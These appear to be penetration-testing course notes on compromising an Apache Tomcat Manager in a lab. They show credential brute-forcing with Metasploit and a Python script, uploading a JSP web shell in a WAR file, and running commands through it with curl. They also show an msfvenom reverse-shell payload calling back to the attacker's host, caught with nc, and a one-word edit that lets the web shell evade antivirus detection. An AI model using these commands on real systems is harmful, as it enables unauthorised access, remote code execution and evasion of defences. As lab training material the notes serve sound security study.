## Tomcat Manager - Login Brute Force

We can use the [auxiliary/scanner/http/tomcat_mgr_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login/) Metasploit module for these purposes, Burp Suite Intruder or any number of scripts to achieve this. We'll use Metasploit for our purposes.
```shell
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local 
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180 
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true 
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
```

To do this, first, fire up Burp Suite and then set the `PROXIES` option like the following:
```shell
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set PROXIES HTTP:127.0.0.1:8080 
PROXIES => HTTP:127.0.0.1:8080
```
![](Pasted%20image%2020260729143705.png)

```shell
3kjS@htb[/htb]$ echo YWRtaW46dmFncmFudA== |base64 -d 

admin:vagrant
```

We can also use [this](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce) Python script to achieve the same result.
```shell
3kjS@htb[/htb]$ python3 mgr_brute.py -h
```

```shell
3kjS@htb[/htb]$ python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-
framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-
framework/data/wordlists/tomcat_mgr_default_pass.txt 

[+] Atacking..... 
[+] Success!! 
[+] Username : b'tomcat' 
[+] Password : b'admin'
```
## Tomcat Manager - WAR File Upload
![](Pasted%20image%2020260729143810.png)

A JSP web shell such as [this](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) can be downloaded and placed within the archive.
![](Pasted%20image%2020260729143831.png)

```url
http://web01.inlanefreight.local:8180/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=54DA226F01ED3A0F5C3C3DC78EBAFFE7
```
![](Pasted%20image%2020260729143845.png)

```shell
3kjS@htb[/htb]$ curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
```
![](Screenshot%202026-07-29%20at%2014.39.11.png)

```shell
3kjS@htb[/htb]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```

```shell
3kjS@htb[/htb]$ nc -lnvp 4443 

listening on [any] 4443 ... 
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 45224 

id 

uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

The web shell as is only gets detected by 2/58 anti-virus vendors.
![](Pasted%20image%2020260729144009.png)

A simple change such as changing:
```java
FileOutputStream(f);stream.write(m);o="Uploaded:
```

to:

```java
FileOutputStream(f);stream.write(m);o="uPlOaDeD:
```

results in 0/58 security vendors flagging the `cmd.jsp` file as malicious at the time of writing.

